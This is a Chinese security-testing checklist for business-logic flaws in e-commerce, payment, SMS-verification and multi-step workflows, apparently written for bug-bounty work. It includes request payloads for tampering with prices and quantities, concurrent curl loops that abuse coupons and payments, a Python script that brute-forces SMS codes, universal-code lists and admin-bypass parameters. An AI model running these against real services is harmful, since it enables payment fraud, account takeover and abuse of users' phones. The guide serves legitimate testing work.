## 一、支付逻辑漏洞

### 1.1 价格篡改

```bash
# 在购物车提交时，修改商品单价
# 抓取订单提交请求，修改 price 字段
POST /api/order/create
{"goodsId": "123", "count": 1, "price": "0.01"}  # 原价改为 0.01

# 负数价格（余额增加）
{"goodsId": "123", "count": 1, "price": "-100"}
```

### 1.2 数量篡改

```bash
# 购买 1 件但请求中修改为 -1（可能退款）
{"goodsId": "123", "count": -1, "price": "99.00"}

# 整数溢出（32位最大值）
{"count": 2147483647}
```

### 1.3 优惠券/积分漏洞

```bash
# 重复使用同一优惠券
# 并发竞争（多线程同时提交同一优惠券）
for i in $(seq 1 20); do
  curl -X POST "https://target.com/api/coupon/use" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"couponId": "COUPON123"}' &
done
wait

# 负数积分（积分兑换时设负数）
{"points": -1000}  # 期望余额增加
```

### 1.4 商家促销绑定：券挂到别人的货（短表有指针）

> 本质：商家后台「把我的促销/券绑到某件货」只信请求里的 `productId`，不查这件货是不是本店的。  
> 和结账改价、改券面值、结账换便宜 SKU **不是一条**。短表一行指向本节。

**认：** 有商家/供应商后台；能建满减、无门槛券、促销；绑货接口名常带 `relate` / `bind` / `attach` / `apply` + `promo` / `salespromotion` / `coupon`；body 里同时有券/活动 ID 和 `productId` / `skuId` / `goodsId`。

**打：**

1. 用本店号建一张规则狠的券（无门槛、面值够大、不限本店品类更好）  
2. 正常绑一次自己的货，抓住绑定请求  
3. **只改** `productId`（或同义字段）成别人店、别的品类的货；券 ID / 活动 ID 不动  
4. 不登录打开 C 端那件货的详情/下单页，看标价和应付  

**算成：** C 端别人那件货的应付价按你这张券掉下来（能下单更好）。只证明绑定接口 200、商家后台列表多了一行 → 不算，必须 C 端价真变。

**假点：** 绑定成功但 C 端价/结算不变；后端按商家会话重写商品、只绑得动自己的货；改的是 C 端结账包里的 `productId` 换成更便宜的 SKU（那是清单里已有的「结账换货」，不是本条）。

和邻近手法别混：

| 本条 | 别当成 |
|------|--------|
| B 端绑券接口，改的是「绑到哪件货」 | C 端结账改 `amount` / `coupon_amount` |
| 自己的券 + 别人的 `productId` | 结账把 `productId` 换成更便宜的 SKU 再付钱 |
| 要看到 C 端价掉下来 | 商家后台列表显示绑成功就算 |

开场半分钟：有商家后台就建券 → 抓绑定包 → 换一个明显不是本店的 `productId` → 打开 C 端看价。

### 1.5 数值测试矩阵（支付/数量/金额字段通杀）

**不止改价格**——把所有参与计算的数值字段（price / count / amount / coupon_amount / points / balance）都穷一遍畸形值：

| 值 | 测什么 |
|---|---|
| `0` | 免单 / 免费 |
| 小数 `1.99` / `0.01` | 客户端按 2 算、服务端按 1 算的舍入差；`1.99` 件按 1 件付 |
| 负数 `-1` / `-100` | 余额/积分反向增加（退钱逻辑被复用） |
| **正负组合** `A=-1 B=2` | 总值=1，绕过"数量必须≥1"校验 |
| **整数溢出** `2147483647` / `1073741824` | 32 位/有符号上限，溢出变负或回绕（礼物数 `1073741824` 类经典） |
| 超大 `999999999` | 越权大额 |
| 空 / 字符串 / 数组 `price[]=a&price[]=b` | 类型混淆 |

> 案例库（腾讯云）：乐视商城价格明文在 URL 直接改；大疆 **https→http** 降级改支付参数 1 元买无人机；七夕性多多改负数刷代币；读览天下**替换支付订单号**。

### 1.6 支付签名缺失 / 订单替换 / 传输层降级

- **签名缺失篡改**：支付数据用 base64/明文传，后端不验签 → 改 `amount`/`orderId` 直接生效（阿里云 base64 数据可被篡改；顺丰宝数量金额无签名）
- **订单号替换**：付款时把高价订单号换成自己已付的低阶订单号；或先创建低价单进支付页、再把订单金额改大、复用已开的支付通道
- **支付 key / 商户号泄露**：前端硬编码的支付 key 可被用来伪造回调（见 `injection-test.md` / `deserialization-test.md` 的回调伪造）
- **传输层降级**：**https 改 http** 使中间人可篡改支付参数（大疆 1 元买无人机案例）
- **运费/附加费负数**：运费设负数使「商品金额 + 运费 > 0」即免单（新东方/中国零食网）

> 判定：改完**真的下单/支付成功、钱/货按篡改后走**才算；只改了请求但服务端按原值/拒绝 = 后端校验了，不算。

## 二、验证码/短信漏洞

> 测到接管/越权闭环（码回显+登录、万能码+登录、爆破+改密）才算打穿。只触发发送/滑块过了/能试密没进号 → 转认证链，别停半截。

### 2.1 验证码可枚举

```python
import requests

# 4位数字验证码 - 逐一尝试
for code in range(0, 10000):
    r = requests.post("https://target.com/api/verify",
        json={"phone": "13800138000", "code": f"{code:04d}"})
    if r.json().get("code") == 0:
        print(f"正确验证码: {code:04d}")
        break

# 验证: 是否有频率限制（前20次无限制 → 没进号继续跟认证链）
```

### 2.2 万能验证码

```
测试以下验证码:
000000, 123456, 888888, 666666
111111, 999999
空值: ""
不发验证码直接提交
```

### 2.3 短信轰炸（内部略测限频，别停半截）

> 只证明能发码不算打穿。下面技术点防把轰炸接口当主洞。

```python
# 测试是否有发送频率限制（仅测试1-2次，不实际轰炸）
# 验证:
# 1. 同号码连续发送间隔是否有限制
# 2. IP 限制是否存在
# 3. 修改 phone 参数但仍发送到固定号码
{"phone": "目标手机号", "realPhone": "13800138000"}
```

> **正文见 `ratelimit-abuse-test.md`**：限频阈值怎么定量、IP 头逐个试、换入口、号码变形、验证码四项（绑会话/绑号/失效/复用）、资源耗尽只打一次。
> **价值在并链**：限频缺失单独是中低危，但它把「验证码可枚举」变成「无限次尝试」——写进主报告的「攻击链佐证」。

## 三、竞争条件（Race Condition）

### 3.1 并发扣减

```python
import threading
import requests

# 余额 100，同时发起 10 次 100 元消费
def consume():
    r = requests.post("https://target.com/api/pay",
        headers={"Authorization": f"Bearer {TOKEN}"},
        json={"amount": 100})
    print(r.json())

threads = [threading.Thread(target=consume) for _ in range(10)]
[t.start() for t in threads]
[t.join() for t in threads]
```

### 3.2 重复提交

```bash
# 订单重复提交（同一请求发多次）
for i in $(seq 1 10); do
  curl -X POST "https://target.com/api/order/pay" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"orderId": "ORDER123", "amount": "0.01"}' &
done
```

## 五、业务逻辑绕过

### 5.1 状态机绕过（多步业务流通用，不只是密码重置）

**前提**：业务是「步骤1 → 步骤2 → … → 完成」的分步流程，且每步有独立请求。**密码重置的流程跳过见 `password-reset-test.md` §七**，本节讲通用面。

**判定核心**：每步的「前置条件是否满足」到底是**服务端校验**还是**只靠前端流程约束**。前端约束 = 可跳过。

四种绕法：

```bash
# ① 直接访问后续步骤 URL（不完成前置）
正常: /order → /pay → /confirm
绕过: 不调 /pay，直接 POST /confirm   → 看是否成功

# ② step 参数篡改
POST /flow   {"step":1,...}  →  {"step":3,...}

# ③ 回退保留结果
先执行步骤3 → 回退到步骤1 → 看步骤3的结果是否还在（状态没回滚）

# ④ 步骤状态 token 不绑定
每步的 temp_token 能否跨步骤复用 / 跨用户用（A 的 token 走 B 的流程）
```

**通用高发场景**：

| 流程 | 跳过哪步 |
|---|---|
| 下单 → 支付 → 确认收货 | 跳过支付直接确认 |
| 实名认证 → 绑卡 → 交易 | 跳过认证 |
| 试用 → 付费 | 改 `is_trial` / `paid` 状态 |
| 审核 → 发布 | 跳过审核直接发布 |
| 注册 → 邮箱验证 → 全功能 | 跳过验证拿到全功能 |

**去伪（必看）**：改完参数/跳步后，**刷新又回原步骤** = 后端确实校验了，是假点，不算洞。必须真的能走到下一步并出结果才算。

### 5.2 测试用参数（越权/绕过类）

```
在请求中添加（常被后端当真）：
debug=true / test=1 / internal=1
is_admin=true / role=admin / admin=1
from_internal=1 / bypass_check=1 / skip_verify=1 / need_check=false
```
> 这些参数名很多系统真会认。命中后别当"前端开关"，**确认后端真的据此放行了**才报。

## 六、按业务场景的逻辑漏洞面（实战发散用）

遇到具体业务时按场景对照——**同一套底层手法（改数值/改 id/并发/跳步/替换）在不同场景长出不同洞**，下面这张「面清单」用来发散思路，不重复各节手法。

| 场景 | 高发逻辑漏洞面 |
|---|---|
| 电商/购物 | 价格/数量篡改、优惠券叠加复用、订单替换（高价换低价）、运费负数免单、限购绕过、SKU 替换 |
| 支付/钱包 | 负数提现、并发提现、多单并发支付（余额不足仍成功）、转账负数、余额回绕、支付签名缺失（§1.6） |
| 外卖/到店 | 评价/打赏金额小数负数、订单金额篡改、强制货到付款、取消/退款逻辑、超送餐范围、优惠复用 |
| 直播/社区 | 礼物数量 `0`/负数/`1073741824` 溢出、协议重发刷量（点赞/分享）、优惠订单无限创建、越权踢人/加管理员 |
| 社交/IM | 强制举报、强制加好友、靓号篡改、群管无限禁言、非会员用会员功能、越权拉黑/替人 |
| 漫画/音乐/视频 | 付费内容 ID 替换免费看、打赏/充值金额负数溢出、会员状态篡改、付费下载 ID 替换 |
| 网约车/出行 | 无限叫车并发、评价分数篡改、限时优惠关键参数改、越权操作他人订单、优惠券替换 |
| 活动/抽奖/裂变 | 邀请码可预测/无限刷、抽奖概率篡改、签到/积分刷取、薅羊毛（券循环用）、任务进度篡改 |
| 内容/评论 | 评论数/点赞数篡改、图片数量过多打客户端 DoS、恶意评分、越权删他人评论 |
| 会员/订阅 | 会员等级/到期时间篡改、试用状态改付费、非会员调会员接口、订阅价格负数 |

**通用发散三问**（每个功能都问）：
1. 这个值（金额/数量/状态/id）**服务端真的重算/重校验了吗**？还是只信前端传的？
2. 这个操作**有没有并发/重复/频率限制**？没有就并发打（优惠券/提现/下单，见 `race-condition-test.md`）
3. 这个流程**能不能跳步 / 换参数打到别人的**？（见 §5.1 + `idor-test.md` + `password-reset-test.md`）

> 来源：腾讯云《SRC逻辑漏洞挖掘详解》、CN-SEC 密码重置指南、Wooyun 逻辑漏洞案例库。手法落地见本篇各节与 `idor-test.md` / `race-condition-test.md` / `password-reset-test.md`。
